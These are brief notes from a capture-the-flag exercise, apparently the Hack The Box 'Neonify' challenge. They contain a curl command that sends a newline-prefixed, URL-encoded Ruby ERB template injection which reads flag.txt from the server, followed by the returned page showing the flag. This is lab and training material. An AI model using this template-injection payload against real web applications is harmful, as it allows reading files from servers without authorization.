'''
https://drt.sh/posts/htb-neonify/

curl 188.166.152.198:31664 \
  -s -X POST -d 'neon=a
%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E'

curl 188.166.152.198:31664 \
>   -s -X POST -d 'neon=a
> %3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E'
<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow">a
HTB{r3pl4c3m3n7_s3cur1ty}</h1>
    </div>
</body>
</html>

'''
